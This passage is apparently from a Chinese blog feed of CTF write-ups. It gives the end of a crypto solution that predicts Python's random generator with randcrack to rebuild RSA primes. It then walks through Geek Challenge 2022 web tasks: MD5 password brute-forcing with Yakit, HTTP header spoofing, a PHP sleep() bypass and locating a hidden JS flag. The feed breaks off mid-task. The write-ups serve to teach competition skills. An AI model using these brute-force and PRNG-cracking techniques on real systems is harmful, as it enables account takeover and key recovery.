class="string">&quot;(76436798540605363536477649122583467659,65537)\n&quot;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># print(pow(int(i),common_d,common_n))</span></span><br><span class="line">        deTest.write(<span class="built_in">str</span>(<span class="built_in">pow</span>(<span class="built_in">int</span>(i),common_d,common_n))+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到原512个随机数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">6664610210323177003</span><br><span class="line">17661097700361369885</span><br><span class="line">303206696427486439</span><br><span class="line">16389245002373137587</span><br><span class="line">5670728676319485833</span><br><span class="line">12056818099668268163</span><br><span class="line">······（此处省略...）</span><br><span class="line">1106083047604041265</span><br><span class="line">17146900470736302356</span><br></pre></td></tr></table></figure><p>由于<code>RandCrack()</code>所需的随机数为32位，而题目中<code>getrandbits(64)</code>是64位，</p><p>了解一下getrandbits对于高位随机数的生成方式，即可将64位的随机数分解为32位的随机数。</p><p>具体原理如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"> </span><br><span class="line">random.seed(<span class="number">0</span>)</span><br><span class="line">a=random.getrandbits(<span class="number">32</span>)</span><br><span class="line">b=random.getrandbits(<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>((b&lt;&lt;<span class="number">32</span>)+a)</span><br><span class="line">random.seed(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(random.getrandbits(<span class="number">64</span>))</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3626764237</span><br><span class="line">1654615998</span><br><span class="line">7106521602475165645</span><br><span class="line">7106521602475165645</span><br></pre></td></tr></table></figure><p>即先得到32位随机数作为低位，然后再用下一个32位随机数作为高位，组成一个64位随机数。</p><p>得知原理后，编写python脚本进行预测最后的<code>top_p</code>和<code>top_q</code>。</p><blockquote><p>这里面还有一个小坑，<code>randcrack</code>中最多提供624个32bits的随机数进行预测，否则会报错：<code>ValueError: Already got enough bits</code></p><p>所以只需要取最后624&#x2F;2&#x3D;312个随机数就行，前面200个舍弃，具体在下面给的代码中会有体现</p></blockquote><p>最终exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">common_n = <span class="number">76436798540605363536477649122583467659</span></span><br><span class="line">common_p = <span class="number">5105923512372711233</span></span><br><span class="line">common_q = <span class="number">14970220050375442123</span></span><br><span class="line">common_phi = (common_p-<span class="number">1</span>)*(common_q-<span class="number">1</span>)</span><br><span class="line">common_d = gmpy2.invert(e, common_phi)</span><br><span class="line">test = <span class="built_in">open</span>(<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;deTest&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> deTest:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> test:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&quot;(76436798540605363536477649122583467659,65537)\n&quot;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># print(pow(int(i),common_d,common_n))</span></span><br><span class="line">        deTest.write(<span class="built_in">str</span>(<span class="built_in">pow</span>(<span class="built_in">int</span>(i),common_d,common_n))+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line">rc = RandCrack()</span><br><span class="line">bitsum = <span class="number">0</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;deTest&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> s:</span><br><span class="line">        a = <span class="built_in">int</span>(l) % (<span class="number">2</span> ** <span class="number">32</span>)</span><br><span class="line">        b = <span class="built_in">int</span>(l) // (<span class="number">2</span> ** <span class="number">32</span>)</span><br><span class="line">        <span class="comment"># print(f&quot;&#123;bitsum&#125; : &#123;(b&lt;&lt;32)+a&#125;&quot;)</span></span><br><span class="line">        bitsum += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> bitsum &lt;= <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        rc.submit(a)</span><br><span class="line">        rc.submit(b)</span><br><span class="line">p = next_prime(rc.predict_getrandbits(<span class="number">1024</span>))</span><br><span class="line">q = next_prime(rc.predict_getrandbits(<span class="number">1024</span>))</span><br><span class="line"><span class="comment"># print(p)</span></span><br><span class="line"><span class="comment"># print(q)</span></span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line">top_n = <span class="number">6778341886512983471750645456950728290523536616361299371741958671360393083882319627518672438545115814129137657182781214208816455570796241668174521203607532582846713044946980024783900646043967377749611378975743784775184880644929838298609658208272073728954171415761808451070649956713090699363828704967425598555240857728605492559334918924364181243615109772911597831275788990921847678043264311757080086808770372237384343263695430482298224638114383481163242159396421912093570982271665015871698548239583006809079195143432434252317382780354946136908751753704879594650848364606279745816610061533345112504778579863240146035803</span></span><br><span class="line">c = <span class="number">418919112322035719080296282188262556318147208740019952103384898777739260429989830467043589948286391778496053290993573572770668930715827948954387013380968757428438279330384918638646330090780491358345953558632784799412654785756895941844475592045474255714700612603241873989982425698945208444003573618381342067450033353217477323111093274062491515883275867746619738296397569905705052009378569807157998159800021519653031832333686380591812114745289471610313845110578057278593565079742329184877876988624852591803357662165422951088131736792374156848783221486055402017298046164798460834330495680663944310194208485613787684535</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> gmpy2.gcd(e, phi) == <span class="number">1</span> <span class="keyword">and</span> n == top_n</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>运行后即可得到flag：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221126110646659.png" alt="image-20221126110646659"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4f43bb3f-12bc-4c85-a19a-833185d1deae&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Geek Challenge 2022]Web</title>
      <link href="/2022/11/18/6c0d4420438b-q1jun/"/>
      <url>/2022/11/18/6c0d4420438b-q1jun/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本篇文章通篇使用<code>Yakit</code>代替Burpsuite进行解题，带大家体验一下yakit的能力。</p><p>官网：<a target="_blank" rel="noopener" href="https://www.yaklang.io/products/intro/">Yakit: 集成化单兵安全能力平台 | Yak Official Website (yaklang.io)</a></p><ol><li>YAK语言简介</li></ol><p>YAK是国际上首个致力于网络安全底层能力融合的垂直开发语言，提供了非常强大的安全能力。Yak是绝大部分 “数据描述语言 &#x2F; 容器语言” 的超集，具备Go所有能力与库生态，VSCode插件等，语法可自定义，是图灵完备的脚本语言，完全<strong>国产</strong>。通过函数提供各类底层安全能力，包括端口扫描、指纹识别、poc框架、shell管理、MITM劫持、强大的插件系统等。</p><ol start="2"><li>YAKIT单兵工具简介</li></ol><p>Yakit是基于yak语言开发的网络安全单兵工具，旨在打造一个覆盖渗透测试全流程的网络安全工具库。通过界面化GUI的形式，降低大家使用Yak的门槛。</p></blockquote><h3 id="0x01-题目：登入试试"><a href="#0x01-题目：登入试试" class="headerlink" title="0x01 题目：登入试试"></a>0x01 题目：登入试试</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GeekChallengeUser ~ % ./登录试试</span><br><span class="line"></span><br><span class="line">=== challenge info ===</span><br><span class="line">type: web</span><br><span class="line">points: 50</span><br><span class="line">description: http://121.5.62.30:38001/EasyTime/</span><br><span class="line">hint: Syclover用户忘了他的密码，咋办哦,依稀记得密码为6位数字,以774开头，这次我们来爆爆他的密码，让他再也不犯相同的错了</span><br><span class="line">=== challenge info ===</span><br><span class="line">please input your flag:</span><br></pre></td></tr></table></figure><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>进入页面，输入用户名<em>Syclover</em>和密码<em>774</em></p><p>打开<strong>Yakit</strong>代理抓包：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118140858118.png" alt="image-20221118140858118"></p><p>很明显密码是经过前端md5加密过的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="number">774</span>)=<span class="number">4e0928</span>de075538c593fbdabb0c5ef2c3</span><br></pre></td></tr></table></figure><p>题目提示 <strong>密码为6位数字,以774开头</strong></p><p>通过脚本生成字典：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">payload = <span class="string">&quot;774&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    payload1 = payload+<span class="built_in">str</span>(<span class="string">&quot;%03d&quot;</span>%i)</span><br><span class="line">    <span class="comment"># print(payload1)</span></span><br><span class="line">    <span class="built_in">print</span>(hashlib.md5(payload1.encode()).hexdigest())</span><br></pre></td></tr></table></figure><p>复制到<strong>yakit</strong>中保存为payload，并保存：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118141320841.png" alt="image-20221118141320841"></p><p>可以在<kbd>Payload 管理</kbd>中查看已保存的payload：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118141437646.png" alt="image-20221118141437646"></p><p>右键劫持到的http数据包，发送到<strong>Web Fuzzer</strong>中进行爆破：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118141534558.png" alt="image-20221118141534558"></p><p>选中需要爆破的密码Value，并右键，选择<code>插入模糊测试字典标签</code>：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118141629503.png" alt="image-20221118141629503"></p><p>选择我们前面生成的Payload：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118141743949.png" alt="image-20221118141743949"></p><p>随后可以在<code>Web Fuzzer</code>面板勾选<kbd>高级设置</kbd>调整Fuzz参数，然后发送数据包，</p><p>即可在右边的<strong>Responses</strong>处看到返回包：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118141842733.png" alt="image-20221118141842733"></p><p>点击<strong>响应大小</strong>即可筛选出爆破成功的返回数据包并查看：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118142040448.png" alt="image-20221118142040448"></p><details class="toggle" ><summary class="toggle-button" style="">查看flag</summary><div class="toggle-content"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;xi_huan_4_l&#125;</span><br></pre></td></tr></table></figure></div></details><h3 id="0x02-题目：来发个包"><a href="#0x02-题目：来发个包" class="headerlink" title="0x02 题目：来发个包"></a>0x02 题目：来发个包</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GeekChallengeUser ~ % ./来发个包</span><br><span class="line"></span><br><span class="line">=== challenge info ===</span><br><span class="line">type: web</span><br><span class="line">points: 50</span><br><span class="line">description: http://120.77.11.65:8101/</span><br><span class="line">hint: vanzy写了个拿flag的接口，但是好像有东西忘记改了</span><br><span class="line">=== challenge info ===</span><br><span class="line"></span><br><span class="line">please input your flag:</span><br></pre></td></tr></table></figure><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p>进入网站，<strong>查看源代码</strong></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118142710107.png" alt="image-20221118142710107"></p><p>发现在<code>/flag.php</code>下发送<strong>POST</strong>请求包即可获得flag：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118142811998.png" alt="image-20221118142811998"></p><details class="toggle" ><summary class="toggle-button" style="">查看flag</summary><div class="toggle-content"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;:D_y0u_has_known_how_to_construct_a_requests_by_yourself&#125;</span><br></pre></td></tr></table></figure></div></details><h3 id="0x03-题目：Can-Can-Need"><a href="#0x03-题目：Can-Can-Need" class="headerlink" title="0x03 题目：Can Can Need"></a>0x03 题目：Can Can Need</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GeekChallengeUser ~ % ./Can Can Need</span><br><span class="line"></span><br><span class="line">=== challenge info ===</span><br><span class="line">type: web</span><br><span class="line">points: 50</span><br><span class="line">description: http://1.14.92.115:4091/</span><br><span class="line">hint: 签个到我就跑（</span><br><span class="line">=== challenge info ===</span><br><span class="line"></span><br><span class="line">please input your flag:</span><br></pre></td></tr></table></figure><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p>签到题，打开 <a target="_blank" rel="noopener" href="http://1.14.92.115:4091/">http://1.14.92.115:4091/</a> 发现提示：请从本地访问</p><p>显然这是考察<strong>HTTP协议</strong>的题，那就根据题目提示一步步走即可拿到flag，这里不过多赘述，直接上步骤：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118143222925.png" alt="image-20221118143222925"></p><p><code>X-Forwarded-For: 127.0.0.1</code>好像不太行，就换个姿势用<code>Client-ip: 127.0.0.1</code></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118143323607.png" alt="image-20221118143323607"></p><p>继续根据提示修改HTTP数据包Headers，添加<code>Referer: sycsec.com</code>:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118143422865.png" alt="image-20221118143422865"></p><p>修改<strong>User-Agent</strong> ：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118143449519.png" alt="image-20221118143449519"></p><p>添加<code>From: VanZY@Syclover.com</code>：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118143516027.png" alt="image-20221118143516027"></p><details class="toggle" ><summary class="toggle-button" style="">查看flag</summary><div class="toggle-content"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;E3sy_Http_hhXD2333&#125;</span><br></pre></td></tr></table></figure></div></details><h3 id="0x04-题目：L0veSyc"><a href="#0x04-题目：L0veSyc" class="headerlink" title="0x04 题目：L0veSyc"></a>0x04 题目：L0veSyc</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GeekChallengeUser ~ % ./L0veSyc</span><br><span class="line"></span><br><span class="line">=== challenge info ===</span><br><span class="line">type: web</span><br><span class="line">points: 50</span><br><span class="line">description: www.sycsec.com</span><br><span class="line">hint: 欢迎来到极客大挑战2022 flag以SYC开头</span><br><span class="line">=== challenge info ===</span><br><span class="line"></span><br><span class="line">please input your flag:</span><br></pre></td></tr></table></figure><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><p>进入<a target="_blank" rel="noopener" href="http://www.sycsec.com/">www.sycsec.com</a> 打开F12即可获得FLAG</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118143816852.png" alt="image-20221118143816852"></p><details class="toggle" ><summary class="toggle-button" style="">查看flag</summary><div class="toggle-content"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;We1c0me_t0_Geek_2022!&#125;</span><br></pre></td></tr></table></figure></div></details><h3 id="0x05-题目：justphp"><a href="#0x05-题目：justphp" class="headerlink" title="0x05 题目：justphp"></a>0x05 题目：justphp</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GeekChallengeUser ~ % ./justphp</span><br><span class="line"></span><br><span class="line">=== challenge info ===</span><br><span class="line">type: web</span><br><span class="line">points: 150</span><br><span class="line">description: http://124.71.215.231:11451</span><br><span class="line">hint: Canzik学长爱睡觉，等他睡醒了就给你flag</span><br><span class="line">=== challenge info ===</span><br><span class="line"></span><br><span class="line">please input your flag:</span><br></pre></td></tr></table></figure><h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><p>打开网址 <a target="_blank" rel="noopener" href="http://124.71.215.231:11451/">http://124.71.215.231:11451</a> 得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span> (<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$sleeptime</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;SleepTime&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$sleeptime</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$sleeptime</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;时间是一个数字啊喂！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$sleeptime</span> &lt; <span class="number">86400</span> * <span class="number">30</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;这点时间哪够Canzik学长睡啊&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$sleeptime</span> &gt; <span class="number">86400</span> * <span class="number">60</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;别让Canzik学长睡死在这啊！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;Canzik学长很满足,表示这次把这辈子的觉都睡完啦！flag在这,自己拿吧:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">sleep</span>((<span class="keyword">int</span>)<span class="variable">$sleeptime</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这是一个sleep()绕过的题，原理是强制转换<code>0.??e</code>开头的科学计数法数字为<code>int</code>时会解析为<code>0</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">❯ php -r &quot;echo var_dump(0.2e123);&quot;</span><br><span class="line">float(2.0E+122)</span><br><span class="line">❯ php -r &quot;echo var_dump((int)0.2e123);&quot;</span><br><span class="line">int(0)</span><br></pre></td></tr></table></figure><blockquote><p> 86400 * 30 &#x3D; 2592000 </p><p>即 0.2592e7</p></blockquote><p>所以payload如下：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118144413337.png" alt="image-20221118144413337"></p><details class="toggle" ><summary class="toggle-button" style="">查看flag</summary><div class="toggle-content"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;C@nzik#lik3s_to#sleeP_in_class?*#&#125;</span><br></pre></td></tr></table></figure></div></details><h3 id="0x06-题目：jsfind"><a href="#0x06-题目：jsfind" class="headerlink" title="0x06 题目：jsfind"></a>0x06 题目：jsfind</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GeekChallengeUser ~ % ./jsfind</span><br><span class="line"></span><br><span class="line">=== challenge info ===</span><br><span class="line">type: web</span><br><span class="line">points: 150</span><br><span class="line">description:</span><br><span class="line">hint: 游戏玩不了的话请使用chrome试试;你知道如何在js文件中找出敏感路径吗？</span><br><span class="line">=== challenge info ===</span><br></pre></td></tr></table></figure><h4 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h4><p>输入<code>yes</code> 开启容器，进入后按F12找到flag.js的路径：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118144620682.png" alt="image-20221118144620682"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//    &quot;js/aaa/aaa/aaa/bbb/bbb/bbb/bbb/bbb/bbb/aaa/aaa/aaa/aaa/aaa/bbb/flag.js&quot;,</span></span><br></pre></td></tr></table></figure><p>打开后得到：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//   flag = U1lDPX5bXTtTWUM9e19fXzorK1NZQywkJCQkOighW10rIiIpW1NZQ10sX18kOisrU1lDLCRfJF86KCFbXSsiIilbU1lDXSxfJF86KytTWUMsJF8kJDooe30rIiIpW1NZQ10sJCRfJDooU1lDW1NZQ10rIiIpW1NZQ10sXyQkOisrU1lDLCQkJF86KCEiIisiIilbU1lDXSwkX186KytTWUMsJF8kOisrU1lDLCQkX186KHt9KyIiKVtTWUNdLCQkXzorK1NZQywkJCQ6KytTWUMsJF9fXzorK1NZQywkX18kOisrU1lDfTtTWUMuJF89KFNZQy4kXz1TWUMrIiIpW1NZQy4kXyRdKyhTWUMuXyQ9U1lDLiRfW1NZQy5fXyRdKSsoU1lDLiQkPShTWUMuJCsiIilbU1lDLl9fJF0pKygoIVNZQykrIiIpW1NZQy5fJCRdKyhTWUMuX189U1lDLiRfW1NZQy4kJF9dKSsoU1lDLiQ9KCEiIisiIilbU1lDLl9fJF0pKyhTWUMuXz0oISIiKyIiKVtTWUMuXyRfXSkrU1lDLiRfW1NZQy4kXyRdK1NZQy5fXytTWUMuXyQrU1lDLiQ7U1lDLiQkPVNZQy4kKyghIiIrIiIpW1NZQy5fJCRdK1NZQy5fXytTWUMuXytTWUMuJCtTWUMuJCQ7U1lDLiQ9KFNZQy5fX18pW1NZQy4kX11bU1lDLiRfXTtTWUMuJChTWUMuJChTWUMuJCQrIlwiIitTWUMuJF8kXysoIVtdKyIiKVtTWUMuXyRfXStTWUMuJCQkXysiXFwiK1NZQy5fXyQrU1lDLiQkXytTWUMuXyRfK1NZQy5fXysiKCdcXCIrU1lDLl9fJCtTWUMuXyRfK1NZQy5fJCQrIlxcIitTWUMuX18kK1NZQy5fJCQrU1lDLl9fJCsiXFwiK1NZQy5fXyQrU1lDLl9fXytTWUMuXyQkKyJ7XFwiK1NZQy5fXyQrU1lDLl9fXytTWUMuJF9fKyJAXFwiK1NZQy5fXyQrU1lDLiQkJCtTWUMuX18kK1NZQy5fX18rU1lDLl8rIl9cXCIrU1lDLl9fJCtTWUMuX18kK1NZQy4kX18rIlxcIitTWUMuX18kK1NZQy4kXyQrU1lDLl9fJCsiXFwiK1NZQy5fXyQrU1lDLl9fJCtTWUMuXyQkKyJcXCIrU1lDLl9fJCtTWUMuX18kK1NZQy5fJCQrU1lDLiQkJF8rIl9cXCIrU1lDLl9fJCtTWUMuX19fK1NZQy4kX18rU1lDLl8kJCtTWUMuJCRfXytTWUMuXyQrU1lDLiQkXyQrU1lDLiQkJF8rIl9cXCIrU1lDLl9fJCtTWUMuX19fK1NZQy4kXyQrIlxcIitTWUMuX18kK1NZQy4kXyQrU1lDLiQkXysiXFwiK1NZQy5fXyQrU1lDLl9fXytTWUMuXyQkK1NZQy5fJCtTWUMuJCRfJCsiXFwiK1NZQy5fXyQrU1lDLl9fXytTWUMuJF8kKyJ9Jyk7IisiXCIiKSgpKSgpOw==</span></span><br></pre></td></tr></table></figure><p>base64解码后得到：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">❯ echo xxx |base64 -d</span><br><span 